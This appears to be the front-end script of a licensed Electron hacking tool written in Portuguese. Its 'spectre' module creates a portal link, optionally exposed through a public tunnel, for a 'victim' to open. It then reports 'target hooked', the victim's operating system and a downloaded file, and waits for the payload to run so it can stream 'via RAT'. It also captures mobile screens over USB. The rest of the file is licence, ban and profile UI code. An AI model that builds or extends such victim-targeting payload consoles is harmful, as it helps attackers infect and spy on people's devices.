// Ao carregar, busca o IP e injeta na interface de cópia
window.electronAPI.getLocalIp().then(ip => {
    const spectreLinkCode = document.getElementById('spectre-link');
    if (spectreLinkCode) {
        spectreLinkCode.innerText = `http://${ip}:8080/portal.html`;
        spectreLinkCode.dataset.url = `http://${ip}:8080/portal.html`;
        spectreLinkCode.dataset.ip = ip;
    }
});

document.getElementById('btn-copy-spectre')?.addEventListener('click', () => {
    const url = document.getElementById('spectre-link')?.dataset.url;
    if (url) {
        navigator.clipboard.writeText(url);
        const btn = document.getElementById('btn-copy-spectre');
        btn.innerText = "Copiado!";
        setTimeout(() => btn.innerText = "Copiar URL", 2000);
    }
});

document.getElementById('btn-tunnel-spectre')?.addEventListener('click', async () => {
    const btn = document.getElementById('btn-tunnel-spectre');
    const oldText = btn.innerText;
    btn.innerText = "Gerando...";
    btn.disabled = true;

    const result = await window.electronAPI.generatePublicLink();
    if (result.success) {
        const spectreLinkCode = document.getElementById('spectre-link');
        spectreLinkCode.innerText = result.url + '/portal.html';
        spectreLinkCode.dataset.url = result.url + '/portal.html';
        term.writeln(`\\r\\n\\x1b[35m[spectre]\\x1b[0m Túnel seguro HTTPS gerado: ${result.url}`);
    } else {
        alert("Erro ao gerar túnel: " + result.message);
    }
    
    btn.innerText = "Túnel Público";
    btn.disabled = false;
});

document.getElementById('btn-start-spectre')?.addEventListener('click', () => {
    const ip = document.getElementById('spectre-link')?.dataset.ip || '127.0.0.1';
    const wsUrl = `ws://${ip}:8080/ws/spectre?role=master`;
    
    if (spectreWs) spectreWs.close();
    
    document.getElementById('spectre-idle').innerText = "Conectando ao Core Engine...";
    
    spectreWs = new WebSocket(wsUrl);
    
    spectreWs.onopen = () => {
        document.getElementById('spectre-idle').innerText = "Monitor Online. Aguardando Vítima acessar o Link...";
        document.getElementById('spectre-idle').style.color = "var(--green)";
        term.writeln(`\r\n\x1b[35m[spectre]\x1b[0m Console mestre conectado. Monitorando pacotes de imagem...`);
    };
    
    spectreWs.onmessage = (event) => {
        try {
            const payload = JSON.parse(event.data);
            if (payload.type === 'payload_drop' && payload.data) {
                // Esconde a label idle
                document.getElementById('spectre-idle').style.display = 'none';
                
                // Pinta notificação no Console
                const feedContainer = document.getElementById('spectre-feed-container') || document.createElement('div');
                if (!document.getElementById('spectre-feed-container')) {
                    feedContainer.id = 'spectre-feed-container';
                    feedContainer.style.background = 'rgba(0,0,0,0.5)';
                    feedContainer.style.border = '1px solid var(--accent)';
                    feedContainer.style.padding = '20px';
                    feedContainer.style.borderRadius = '8px';
                    feedContainer.style.textAlign = 'center';
                    
                    const oldImg = document.getElementById('spectre-feed');
                    if (oldImg) oldImg.parentNode.insertBefore(feedContainer, oldImg.nextSibling);
                }
                
                feedContainer.innerHTML = `
                    <div style="color: var(--green); font-size: 16px; font-weight: bold; margin-bottom: 10px;">⚠️ ALVO FISGADO</div>
                    <div style="font-size: 13px; margin-bottom: 5px;">Sistema Operacional Detectado: <b>${payload.data.os}</b></div>
                    <div style="font-size: 13px; color: var(--accent);">O arquivo <b>${payload.data.file}</b> foi baixado no dispositivo!</div>
                    <div style="font-size: 11px; color: rgba(255,255,255,0.5); margin-top: 10px;">Aguardando execução do payload para estabelecer streaming total via RAT...</div>
                `;
                
                term.writeln(`\\r\\n\\x1b[32m[spectre]\\x1b[0m Confirmação de Payload recebida do dispositivo (${payload.data.os})!`);
            }
        } catch(e) {}
    };
    
    spectreWs.onerror = () => {
        document.getElementById('spectre-idle').innerText = "Erro ao conectar. O Motor Core está online?";
        document.getElementById('spectre-idle').style.color = "var(--red)";
    };
    
    spectreWs.onclose = () => {
        document.getElementById('spectre-idle').innerText = "Conexão encerrada.";
        document.getElementById('spectre-idle').style.color = "var(--text-3)";
        document.getElementById('spectre-idle').style.display = 'block';
        if (document.getElementById('spectre-feed-container')) document.getElementById('spectre-feed-container').style.display = 'none';
        document.getElementById('spectre-feed').style.display = 'none';
    };
});

document.getElementById('btn-start-usb')?.addEventListener('click', async () => {
    const select = document.getElementById('spectre-device-select');
    if (!select || !select.value) {
        term.writeln(`\\r\\n\\x1b[31m[spectre-usb]\\x1b[0m Selecione um dispositivo móvel na lista antes de interceptar.`);
        return;
    }
    const [platformStr, deviceId] = select.value.split('|');

    const idleText = document.getElementById('spectre-idle');
    const feedImg = document.getElementById('spectre-feed');
    const feedVideo = document.getElementById('spectre-usb-feed');

    idleText.innerText = 'Conectando ao Dispositivo Móvel via USB...';
    idleText.style.color = 'var(--text-3)';
    idleText.style.display = 'block';
    feedImg.style.display = 'none';
    if (feedVideo) feedVideo.style.display = 'none';

    const result = await window.electronAPI.startUSBCapture(platformStr, deviceId);

    if (!result.success) {
        idleText.innerText = 'Erro: ' + result.message;
        idleText.style.color = 'var(--red)';
        term.writeln(`\\r\\n\\x1b[31m[spectre-usb]\\x1b[0m ${result.message}`);
        return;
    }

    term.writeln(`\\r\\n\\x1b[35m[spectre-usb]\\x1b[0m Captura via ${platformStr} iniciada. Aguardando frames...`);

    // Registra o listener de frames (uma só vez)
    if (!window._usbFrameListening) {
        window._usbFrameListening = true;
        window.electronAPI.onUSBFrame((base64Frame) => {
            idleText.style.display = 'none';
            feedImg.src = base64Frame;
            feedImg.style.display = 'block';
        });
    }
});

// Lógica para listar os dispositivos móveis no Espetor
async function scanSpectreDevices() {
    const select = document.getElementById('spectre-device-select');
    if (!select) return;
    
    select.innerHTML = '<option value="">Buscando dispositivos...</option>';
    
    const res = await window.electronAPI.getMobileDevices();
    select.innerHTML = '';
    
    if (res.success && res.devices && res.devices.length > 0) {
        res.devices.forEach(device => {
            const opt = document.createElement('option');
            opt.value = `${device.platform}|${device.id}`;
            opt.innerText = device.name || device.id;
            select.appendChild(opt);
        });
    } else {
        select.innerHTML = '<option value="">Nenhum dispositivo móvel detectado</option>';
    }
}

document.getElementById('btn-spectre-scan')?.addEventListener('click', scanSpectreDevices);

// ═══════════ Auth & Access Control (HWID) ═══════════

const authView = document.getElementById('view-auth');
const bannedView = document.getElementById('view-banned');
const mainTerminalView = document.getElementById('view-terminal');
const mainToolbar = document.getElementById('main-toolbar');
const mainTitlebar = document.getElementById('main-titlebar');
const bannedHwidDisplay = document.getElementById('banned-hwid-display');

let currentHWID = null;
let currentAvatarUrl = 'https://api.dicebear.com/7.x/notionists/svg?seed=Felix&backgroundColor=b6e3f4'; // Default

function grantAccess(user) {
    // Hide auth views
    authView.classList.remove('active');
    authView.style.display = 'none';
    bannedView.classList.remove('active');
    bannedView.style.display = 'none';

    // Show app
    mainTitlebar.style.display = 'flex';
    mainToolbar.style.display = 'flex';
    
    // Mostra Dashboard Bento Box por padrão
    const dashboardView = document.getElementById('view-dashboard');
    if (dashboardView) {
        dashboardView.classList.add('active');
        dashboardView.style.display = 'flex';
    } else {
        mainTerminalView.classList.add('active');
        mainTerminalView.style.display = 'flex';
    }
    
    // Atualiza botão segmentado ativo
    document.querySelectorAll('.seg-btn').forEach(b => b.classList.remove('active'));
    document.querySelector('.seg-btn[data-target="view-dashboard"]')?.classList.add('active');
    
    // Update Header Profile and Bento Box
    const avatarToUse = user.avatar_url || currentAvatarUrl;
    document.getElementById('profile-avatar').src = avatarToUse;
    document.getElementById('profile-name').innerText = user.username;
    document.getElementById('user-profile-header').style.display = 'flex';
    
    const bentoAvatar = document.getElementById('bento-avatar');
    if (bentoAvatar) bentoAvatar.src = avatarToUse;
    const bentoName = document.getElementById('bento-name');
    if (bentoName) bentoName.innerText = user.username;

    // Start Realtime Ban Heartbeat (10s)
    if (!window.banHeartbeat) {
        window.banHeartbeat = setInterval(async () => {
            if (currentHWID) {
                const isBanned = await window.electronAPI.checkBanStatus(currentHWID);
                if (isBanned) {
                    clearInterval(window.banHeartbeat);
                    window.banHeartbeat = null;
                    
                    mainTitlebar.style.display = 'none';
                    mainToolbar.style.display = 'none';
                    mainTerminalView.classList.remove('active');
                    mainTerminalView.style.display = 'none';
                    
                    showBannedScreen(currentHWID);
                    return;
                }

                // Verifica status da Licença (Auto-Logout)
                const license = await window.electronAPI.getLicenseInfo(currentHWID);
                let validLicense = false;
                if (license && license.is_active) {
                    if (license.expires_at) {
                        if (new Date() < new Date(license.expires_at)) {
                            validLicense = true;
                        }
                    } else {
                        validLicense = true;
                    }
                }
                
                if (!validLicense) {
                    clearInterval(window.banHeartbeat);
                    window.banHeartbeat = null;
                    
                    // RIGID LOGOUT: Alerta e desloga completamente da memória (encerra websockets e tarefas)
                    alert("⚠️ ALERTA DE SEGURANÇA ⚠️\n\nO tempo do seu Token/Licença expirou. A sua sessão está sendo encerrada e todos os módulos (incluindo varreduras e inteligência) serão bloqueados e limpos da memória.");
                    window.location.reload();
                    
                    return;
                }
            }
        }, 10000);
    }

    // Fit terminal
    setTimeout(() => { if (typeof fitAddon !== 'undefined') fitAddon.fit(); }, 100);
}

function showBannedScreen(hwid) {
    // RIGID BAN: Destrói completamente todos os elementos da interface para não sobrar nada a ser "des-escondido" no DevTools
    document.body.innerHTML = `
        <div style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #0a0000; z-index: 9999999999; display: flex; align-items: center; justify-content: center; flex-direction: column;">
            <div style="width: 100px; height: 100px; border-radius: 50%; background: rgba(220, 38, 38, 0.2); display: flex; align-items: center; justify-content: center; margin-bottom: 25px;">
                <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#dc2626" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
            </div>
            <div style="color: #dc2626; font-size: 64px; font-weight: 900; letter-spacing: 10px; text-shadow: 0 0 20px rgba(220, 38, 38, 0.5);">BANNED</div>
            <div style="color: #fff; font-size: 16px; margin-top: 20px; font-family: monospace; letter-spacing: 2px;">ACESSO BLOQUEADO PERMANENTEMENTE</div>
            <div style="color: #ff4444; font-size: 12px; margin-top: 15px; font-family: monospace;">A sua identificação de Hardware (HWID) foi suspensa pelo Administrador.</div>
            <div style="color: rgba(255,255,255,0.3); font-size: 10px; margin-top: 30px; font-family: monospace; background: rgba(255,0,0,0.1); padding: 5px 15px; border-radius: 4px;">HWID: ${hwid || 'UNKNOWN'}</div>
        </div>
    `;
}

function showLicenseScreen() {
    authView.classList.remove('active');
    authView.style.display = 'none';
    
    const licenseView = document.getElementById('view-license');
    if (licenseView) {
        licenseView.classList.add('active');
        licenseView.style.display = 'flex';
    }
}

// ── Auto Login on Load ──
// NOTA: O renderer.js é carregado no final do <body>,
// portanto o DOM já está pronto. Usamos uma IIFE async para iniciar imediatamente.
(async () => {
    try {
        if (!window.electronAPI) {
            console.error('[AUTH] window.electronAPI não está disponível! Verifique preload.js.');
            return;
        }
        
        currentHWID = await window.electronAPI.getHWID();
        console.log('[AUTH] HWID carregado:', currentHWID ? currentHWID.substring(0, 8) + '...' : 'NULL');
        
        // Tentativa de auto login (sem username)
        const res = await window.electronAPI.authLoginOrRegister(currentHWID, null, null);
        console.log('[AUTH] Resposta auto-login:', JSON.stringify(res).substring(0, 100));

        if (res.success && res.user) {
            if (!res.requireLicense) {
                // TEM LICENÇA ATIVA → login automático direto
                console.log('[AUTH] Licença válida. Entrando como:', res.user.username);
                currentAvatarUrl = res.user.avatar_url || currentAvatarUrl;
                grantAccess(res.user);
                return;
            }
            
            // Tem conta mas não tem licença → preenche formulário, mostra tela de ativação
            console.log('[AUTH] Usuário encontrado mas sem licença. Pedindo ativação.');
            document.querySelector('#step-setup-profile .card-title').innerText = 'Bem-vindo de volta';
            document.querySelector('#step-setup-profile .card-desc').innerText = 'Ative sua licença para continuar.';
            document.getElementById('setup-username').value = res.user.username;
            
            if (res.user.avatar_url) {
                document.getElementById('avatar-preview').src = res.user.avatar_url;
                currentAvatarUrl = res.user.avatar_url;
            }
            
            const btn = document.getElementById('btn-enter-system');
            btn.innerText = `Continuar como ${res.user.username}`;
            
        } else if (res.banned) {
            console.log('[AUTH] Usuário banido!');
            showBannedScreen(currentHWID);
        } else {
            // Usuário novo → fica na tela de setup
            console.log('[AUTH] Novo usuário. Aguardando cadastro.');
        }
    } catch (err) {
        console.error('[AUTH] Falha crítica no auto-login:', err);
    }
})();


// Event Listeners para a Licença
document.getElementById('btn-show-policies')?.addEventListener('click', () => {
    const modal = document.getElementById('modal-policies');
    if (modal) {
        modal.style.opacity = '0';
        modal.style.transition = 'opacity 0.3s ease';
        modal.style.display = 'flex';
        // Pequeno atraso para a animação de opacidade
        setTimeout(() => modal.style.opacity = '1', 10);
    }
});

document.getElementById('btn-close-policies')?.addEventListener('click', () => {
    const modal = document.getElementById('modal-policies');
    if (modal) {
        modal.style.opacity = '0';
        setTimeout(() => modal.style.display = 'none', 300);
    }
});

// Add Enter key gesture for login inputs
['setup-username', 'license-key-input'].forEach(id => {
    const el = document.getElementById(id);
    if (el) {
        el.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                if (id === 'setup-username') {
                    document.getElementById('btn-enter-system').click();
                } else {
                    document.getElementById('btn-validate-license').click();
                }
            }
        });
    }
});

// ── Setup Profile / Registration ──
document.getElementById('btn-enter-system').addEventListener('click', async () => {
    const btn = document.getElementById('btn-enter-system');
    const username = document.getElementById('setup-username').value.trim();
    const errorMsg = document.getElementById('setup-error-msg');
    
    if (!username) {
        errorMsg.innerText = 'Digite um nome válido.';
        errorMsg.style.display = 'block';
        return;
    }

    const originalText = btn.innerText;
    btn.innerHTML = '<span style="color: var(--text-2);">Autenticando Placa...</span>';
    btn.disabled = true;
    
    try {
        const res = await window.electronAPI.authLoginOrRegister(currentHWID, username, currentAvatarUrl);
        
        if (res.requireLicense) {
            btn.innerText = originalText;
            btn.disabled = false;
            showLicenseScreen();
            return;
        }

        if (res.success && res.user) {
            errorMsg.style.display = 'none';
            // Restaura o botão antes de conceder acesso
            btn.innerText = originalText;
            btn.disabled = false;
            grantAccess(res.user);
        } else if (res.banned) {
            showBannedScreen(currentHWID);
        } else {
            btn.innerText = originalText;
            btn.disabled = false;
            errorMsg.innerText = res.message || 'Erro ao registrar sistema.';
            errorMsg.style.display = 'block';
        }
    } catch (error) {
        btn.innerText = originalText;
        btn.disabled = false;
        errorMsg.innerText = 'Falha de comunicação com o núcleo local.';
        errorMsg.style.display = 'block';
    }
});

// ── License Activation ──
const btnActivateLicense = document.getElementById('btn-activate-license');
if (btnActivateLicense) {
    btnActivateLicense.addEventListener('click', async () => {
        const input = document.getElementById('license-key-input');
        const errorMsg = document.getElementById('license-error-msg');
        const key = input.value.trim();

        if (!key) {
            errorMsg.innerText = 'Por favor, insira a chave do produto.';
            errorMsg.style.display = 'block';
            return;
        }

        const originalHtml = btnActivateLicense.innerHTML;
        btnActivateLicense.innerHTML = '<span style="color: var(--text-2);">Validando...</span>';
        btnActivateLicense.disabled = true;

        try {
            const res = await window.electronAPI.activateLicense(key, currentHWID);
            
            if (res.success) {
                // Sucesso! Volta para a tela de login/perfil
                errorMsg.style.display = 'none';
                
                const licenseView = document.getElementById('view-license');
                if (licenseView) {
                    licenseView.classList.remove('active');
                    licenseView.style.display = 'none';
                }
                
                // Recarrega o fluxo de login
                authView.classList.add('active');
                authView.style.display = 'flex';
                
                // Força uma rechecagem para puxar o perfil atual ou criar novo
                const loginRes = await window.electronAPI.authLoginOrRegister(currentHWID, null, null);
                if (loginRes.success && loginRes.user) {
                    document.getElementById('setup-username').value = loginRes.user.username;
                    const btnEnter = document.getElementById('btn-enter-system');
                    btnEnter.innerText = `Logar como ${loginRes.user.username}`;
                }
            } else {
                errorMsg.innerText = res.message || 'Chave inválida.';
                errorMsg.style.display = 'block';
            }
        } catch (error) {
            errorMsg.innerText = 'Erro ao contactar o servidor.';
            errorMsg.style.display = 'block';
        } finally {
            btnActivateLicense.innerHTML = originalHtml;
            btnActivateLicense.disabled = false;
        }
    });
}

// ── Avatar Picker UI Logic ──
document.getElementById('profile-avatar')?.addEventListener('click', () => {
    document.getElementById('modal-avatar').style.display = 'flex';
});

document.getElementById('avatar-trigger')?.addEventListener('click', () => {
    document.getElementById('modal-avatar').style.display = 'flex';
});

document.getElementById('settings-avatar-trigger')?.addEventListener('click', () => {
    document.getElementById('modal-avatar').style.display = 'flex';
});

document.getElementById('btn-close-avatar')?.addEventListener('click', () => {
    document.getElementById('modal-avatar').style.display = 'none';
});

// ── Logout Logic ──
document.getElementById('btn-logout')?.addEventListener('click', () => {
    // Para deslogar, basta recarregar a janela e limpar os campos ou forçar a recarga
    window.location.reload();
});

// ── Fetch GPU Info ──
async function fetchGPUInfo() {
    const gpuDisplay = document.getElementById('gpu-info-display');
    if (!gpuDisplay) return;
    
    try {
        const gpuInfo = await window.electronAPI.getGPUInfo();
        if (gpuInfo && gpuInfo.gpuDevice && gpuInfo.gpuDevice.length > 0) {
            // Find the active GPU
            const activeGPU = gpuInfo.gpuDevice.find(g => g.active) || gpuInfo.gpuDevice[0];
            let name = activeGPU.vendorString || '';
            if (activeGPU.deviceString) name += ' ' + activeGPU.deviceString;
            
            // Add OS string to help identify platform
            if (name === '') name = 'GPU Genérica (' + process.platform + ')';
            
            gpuDisplay.innerText = name;
            gpuDisplay.style.color = 'var(--green)';
        } else {
            gpuDisplay.innerText = 'Não foi possível detectar a GPU';
            gpuDisplay.style.color = 'var(--orange)';
        }
    } catch (e) {
        gpuDisplay.innerText = 'Erro ao ler hardware';
        gpuDisplay.style.color = 'var(--red)';
    }
}

setTimeout(fetchGPUInfo, 100);

document.querySelectorAll('.avatar-option').forEach(img => {
    img.addEventListener('click', (e) => {
        document.querySelectorAll('.avatar-option').forEach(el => el.style.borderColor = 'transparent');
        e.target.style.borderColor = 'var(--accent)';
        currentAvatarUrl = e.target.getAttribute('data-url');
    });
});

document.getElementById('btn-save-avatar').addEventListener('click', async () => {
    const customUrl = document.getElementById('custom-avatar-url').value.trim();
    if (customUrl) {
        currentAvatarUrl = customUrl;
    }
    
    const profileAvatar = document.getElementById('profile-avatar');
    if (profileAvatar) profileAvatar.src = currentAvatarUrl;
    
    const avatarPreview = document.getElementById('avatar-preview');
    if (avatarPreview) avatarPreview.src = currentAvatarUrl;
    
    const settingsPreview = document.getElementById('settings-avatar-preview');
    if (settingsPreview) settingsPreview.src = currentAvatarUrl;
    
    document.getElementById('modal-avatar').style.display = 'none';
    
    // Atualiza silenciosamente no BD se já estiver logado (username existe)
    if (currentHWID && document.getElementById('setup-username').value.trim()) {
        try {
            await window.electronAPI.authLoginOrRegister(currentHWID, document.getElementById('setup-username').value.trim(), currentAvatarUrl);
        } catch(e) {}
    }
});

// ═══════════ Auto Updater UI Logic ═══════════
const btnCheckUpdate = document.getElementById('btn-check-update');
const btnInstallUpdate = document.getElementById('btn-install-update');
const statusText = document.getElementById('update-status-text');
const progressContainer = document.getElementById('update-progress-container');
const progressBar = document.getElementById('update-progress-bar');

if (btnCheckUpdate) {
    btnCheckUpdate.addEventListener('click', () => {
        window.electronAPI.checkUpdate();
        btnCheckUpdate.disabled = true;
    });
}

if (btnInstallUpdate) {
    btnInstallUpdate.addEventListener('click', () => {
        window.electronAPI.installUpdate();
    });
}

if (window.electronAPI && window.electronAPI.onUpdateStatus) {
    window.electronAPI.onUpdateStatus((msg) => {
        if (statusText) statusText.innerText = msg;
        if (msg.includes('O sistema está atualizado') || msg.includes('Erro')) {
            if (btnCheckUpdate) btnCheckUpdate.disabled = false;
            if (progressContainer) progressContainer.style.display = 'none';
        }
    });

    window.electronAPI.onUpdateProgress((progressObj) => {
        if (progressContainer) progressContainer.style.display = 'block';
        if (progressBar) progressBar.style.width = `${progressObj.percent}%`;
        if (statusText) statusText.innerText = `Baixando... ${Math.round(progressObj.percent)}%`;
    });

    window.electronAPI.onUpdateReady((msg) => {
        if (statusText) statusText.innerText = msg;
        if (progressContainer) progressContainer.style.display = 'none';
        if (btnCheckUpdate) btnCheckUpdate.style.display = 'none';
        if (btnInstallUpdate) btnInstallUpdate.style.display = 'inline-flex';
    });
}

// ── License Settings & Policies ──
async function loadLicenseSettings() {
    if (!window.electronAPI) return;
    try {
        let hwid = currentHWID;
        if (!hwid) {
            hwid = await window.electronAPI.getHWID();
            currentHWID = hwid;
        }
        
        const license = await window.electronAPI.getLicenseInfo(hwid);
        const badge = document.getElementById('license-status-badge');
        const daysLeft = document.getElementById('license-days-left');
        const serialKey = document.getElementById('license-serial-key');
        const progress = document.getElementById('license-progress-bar');
        const alertMsg = document.getElementById('license-alert');

        if (license) {
            if (serialKey) serialKey.innerText = license.key || '----';

            if (!license.is_active) {
                if (badge) {
                    badge.style.background = 'rgba(239, 68, 68, 0.15)';
                    badge.style.color = 'var(--red)';
                    badge.style.borderColor = 'rgba(239, 68, 68, 0.3)';
                    badge.innerHTML = '<span style="width: 6px; height: 6px; border-radius: 50%; background: currentColor;"></span> Inativa / Suspensa';
                }
                if (daysLeft) daysLeft.innerText = '0 dias';
                if (progress) {
                    progress.style.width = '0%';
                    progress.style.background = 'var(--red)';
                }
                return;
            }

            if (license.expires_at) {
                const expires = new Date(license.expires_at);
                const activated = new Date(license.activated_at || license.created_at);
                const totalTime = Math.max(1, expires - activated);

                if (window.licenseInterval) clearInterval(window.licenseInterval);

                const updateTimer = () => {
                    const now = new Date();
                    const diffTime = Math.max(0, expires - now);
                    
                    if (diffTime <= 0) {
                        if (daysLeft) daysLeft.innerText = '0d 0h 0m 0s';
                        if (progress) { progress.style.width = '0%'; progress.style.background = 'var(--red)'; }
                        clearInterval(window.licenseInterval);
                        return;
                    }

                    const d = Math.floor(diffTime / (1000 * 60 * 60 * 24));
                    const h = Math.floor((diffTime / (1000 * 60 * 60)) % 24);
                    const m = Math.floor((diffTime / 1000 / 60) % 60);
                    const s = Math.floor((diffTime / 1000) % 60);

                    if (daysLeft) {
                        daysLeft.innerHTML = `<span style="font-size:20px;">${d}d</span> <span style="font-size:14px; color:var(--text-2); font-weight: 500;">${h}h ${m}m ${s}s</span>`;
                    }

                    const percentLeft = Math.max(0, Math.min(100, (diffTime / totalTime) * 100));
                    if (progress) progress.style.width = `${percentLeft}%`;

                    if (d <= 3) {
                        if (progress) progress.style.background = 'var(--amber)';
                        if (badge) {
                            badge.style.background = 'rgba(245, 158, 11, 0.15)';
                            badge.style.color = 'var(--amber)';
                            badge.style.borderColor = 'rgba(245, 158, 11, 0.3)';
                        }
                        if (alertMsg) alertMsg.style.display = 'block';
                    } else {
                        if (progress) progress.style.background = 'var(--green)';
                        if (alertMsg) alertMsg.style.display = 'none';
                        if (badge) {
                            badge.style.background = 'rgba(52,211,153,0.15)';
                            badge.style.color = 'var(--green)';
                            badge.style.borderColor = 'rgba(52,211,153,0.3)';
                            badge.innerHTML = '<span style="width: 6px; height: 6px; border-radius: 50%; background: currentColor;"></span> Ativo';
                        }
                    }
                };

                updateTimer();
                window.licenseInterval = setInterval(updateTimer, 1000);

            } else {
                if (window.licenseInterval) clearInterval(window.licenseInterval);
                if (daysLeft) {
                    daysLeft.innerHTML = `<div style="background: rgba(255, 59, 48, 0.15); backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px); border: 1px solid rgba(255, 59, 48, 0.3); color: #ff3b30; padding: 4px 10px; border-radius: 8px; font-size: 14px; font-weight: 800; display: inline-block; box-shadow: 0 4px 12px rgba(255, 59, 48, 0.2), inset 0 1px 1px rgba(255, 255, 255, 0.1); letter-spacing: 0.5px;">PERMANENTE</div>`;
                }
                if (progress) {
                    progress.style.width = '100%';
                    progress.style.background = 'var(--red)';
                    progress.style.boxShadow = '0 0 10px rgba(255,59,48,0.5)';
                }
                if (alertMsg) alertMsg.style.display = 'none';
            }
        } else {
            if (serialKey) serialKey.innerText = 'Não Encontrada';
            if (badge) {
                badge.style.background = 'rgba(239, 68, 68, 0.15)';
                badge.style.color = 'var(--red)';
                badge.style.borderColor = 'rgba(239, 68, 68, 0.3)';
                badge.innerHTML = '<span style="width: 6px; height: 6px; border-radius: 50%; background: currentColor;"></span> Inválida / Ausente';
            }
            if (daysLeft) daysLeft.innerText = '--';
            if (progress) {
                progress.style.width = '0%';
                progress.style.background = 'var(--red)';
            }
        }
    } catch (e) {
        console.error('Erro ao carregar configurações de licença:', e);
    }
}

document.getElementById('btn-show-policies')?.addEventListener('click', () => {
    document.getElementById('modal-policies').style.display = 'flex';
});

document.getElementById('btn-close-policies')?.addEventListener('click', () => {
    document.getElementById('modal-policies').style.display = 'none';
});

// ── AGENTE IG (IA) LÓGICA FRONTEND ──
window.copyCode = (btn, escapedCode) => {
    const code = decodeURIComponent(escapedCode);
    navigator.clipboard.writeText(code).then(() => {
        const originalHTML = btn.innerHTML;
        btn.innerHTML = `
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#34c759" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="margin-right: 4px;"><polyline points="20 6 9 17 4 12"></polyline></svg>
            <span style="color: #34c759; font-weight: 600;">Copiado!</span>
        `;
        btn.style.borderColor = 'rgba(52, 199, 89, 0.3)';
        btn.style.background = 'rgba(52, 199, 89, 0.1)';
        setTimeout(() => {
            btn.innerHTML = originalHTML;
            btn.style.borderColor = 'rgba(0,0,0,0.1)';
            btn.style.background = 'transparent';
        }, 2000);
    }).catch(err => {
        console.error('Falha ao copiar código:', err);
    });
};

function parseMarkdown(text) {
    if (!text) return "";
    
    // Normalizar quebras de linha literais
    let html = text.replace(/\\n/g, '\n');
    
    // Escapar tags HTML básicas para evitar injeção
    html = html
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;");
        
    // 1. Blocos de código: ```lang\ncode\n```
    const codeBlockRegex = /```(\w*)\n([\s\S]*?)```/g;
    html = html.replace(codeBlockRegex, (match, lang, code) => {
        const language = lang || "code";
        const trimmedCode = code.trim();
        const escapedCode = encodeURIComponent(trimmedCode);
        
        return `
            <div class="code-container" style="background: #f5f5f7; border: 1px solid rgba(0,0,0,0.06); border-radius: 10px; margin: 14px 0; overflow: hidden; font-family: monospace;">
                <div class="code-header" style="background: rgba(0,0,0,0.02); padding: 8px 16px; border-bottom: 1px solid rgba(0,0,0,0.05); display: flex; justify-content: space-between; align-items: center; color: #1d1d1f;">
                    <span style="font-size: 11px; color: #86868b; text-transform: uppercase; font-weight: 600; letter-spacing: 0.8px;">${language}</span>
                    <button class="copy-btn" onclick="copyCode(this, '${escapedCode}')" style="background: transparent; border: 1px solid rgba(0,0,0,0.1); color: #1d1d1f; font-size: 11px; cursor: pointer; display: flex; align-items: center; padding: 4px 10px; border-radius: 6px; transition: all 0.2s; outline: none; font-family: inherit;">
                        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right: 4px;"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
                        Copiar
                    </button>
                </div>
                <pre style="margin: 0; padding: 14px; overflow-x: auto; font-size: 13px; line-height: 1.55; color: #24292e; max-height: 350px; background: transparent;"><code style="font-family: inherit; white-space: pre;">${trimmedCode}</code></pre>
            </div>
        `;
    });

    // 2. Citações (Blockquotes): > text
    html = html.replace(/^\s*&gt;\s+(.+)$/gm, '<blockquote style="border-left: 3px solid #007aff; background: rgba(0, 122, 255, 0.05); margin: 12px 0; padding: 8px 16px; border-radius: 0 6px 6px 0; color: #48484a; font-style: italic;">$1</blockquote>');

    // 3. Títulos (Headers)
    html = html.replace(/^\s*#{6}\s+(.+)$/gm, '<h6 style="font-size: 12px; margin: 12px 0 6px 0; font-weight: 600; color: #1d1d1f;">$1</h6>');
    html = html.replace(/^\s*#{5}\s+(.+)$/gm, '<h5 style="font-size: 13px; margin: 14px 0 8px 0; font-weight: 600; color: #1d1d1f;">$1</h5>');
    html = html.replace(/^\s*#{4}\s+(.+)$/gm, '<h4 style="font-size: 14px; margin: 16px 0 10px 0; font-weight: 600; color: #1d1d1f;">$1</h4>');
    html = html.replace(/^\s*#{3}\s+(.+)$/gm, '<h3 style="font-size: 15px; margin: 18px 0 10px 0; font-weight: 600; color: #1d1d1f;">$1</h3>');
    html = html.replace(/^\s*#{2}\s+(.+)$/gm, '<h2 style="font-size: 16px; margin: 20px 0 12px 0; font-weight: 600; border-bottom: 1px solid rgba(0,0,0,0.06); padding-bottom: 6px; color: #1d1d1f;">$1</h2>');
    html = html.replace(/^\s*#{1}\s+(.+)$/gm, '<h1 style="font-size: 18px; margin: 22px 0 14px 0; font-weight: 700; color: #1d1d1f;">$1</h1>');

    // 4. Código Inline: `code`
    html = html.replace(/`([^`]+)`/g, '<code style="background: rgba(0,0,0,0.04); padding: 3px 6px; border-radius: 5px; font-family: monospace; font-size: 12px; color: #ff2d55; border: 1px solid rgba(0,0,0,0.02);">$1</code>');

    // 5. Negrito & Itálico
    html = html.replace(/\*\*([^*]+)\*\*/g, '<strong style="font-weight: 600; color: #1d1d1f;">$1</strong>');
    html = html.replace(/\*([^*]+)\*/g, '<em style="font-style: italic; color: #1d1d1f;">$1</em>');

    // 6. Listas Ordenadas e Não Ordenadas
    let inList = false;
    let lines = html.split('\n');
    for (let i = 0; i < lines.length; i++) {
        let line = lines[i];
        const isBullet = /^\s*[-*]\s+(.+)$/.exec(line);
        const isNumbered = /^\s*\d+\.\s+(.+)$/.exec(line);
        
        if (isBullet) {
            let content = isBullet[1];
            if (!inList) {
                lines[i] = '<ul style="margin: 10px 0; padding-left: 20px; list-style-type: disc; color: #1d1d1f;">\n<li style="margin-bottom: 6px; line-height: 1.55;">' + content + '</li>';
                inList = 'ul';
            } else if (inList === 'ul') {
